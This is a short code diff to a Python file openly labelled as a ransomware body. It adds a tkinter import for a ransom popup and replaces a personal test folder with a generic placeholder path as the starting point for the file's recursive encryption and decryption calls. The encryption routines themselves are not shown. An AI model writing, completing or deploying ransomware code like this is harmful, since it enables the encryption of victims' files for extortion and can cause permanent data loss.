@@ -1,4 +1,5 @@
 import RSA, os
+from tkinter import *
 
 # Ransomware body:
 
@@ -51,7 +52,7 @@ def recursive_decryption(path):
         return None
 
 
-recursive_encryption('C:/Users/Owner/Documents/test_bay/')
+recursive_encryption('C:/example/file/path/to/start/')
 #tkinter popup
 root = Tk()
 
@@ -86,5 +87,5 @@ def button():
 button()
 root.mainloop()
 
-recursive_decryption('C:/Users/Owner/Documents/test_bay/')
+recursive_decryption('C:/example/file/path/to/start/')
 
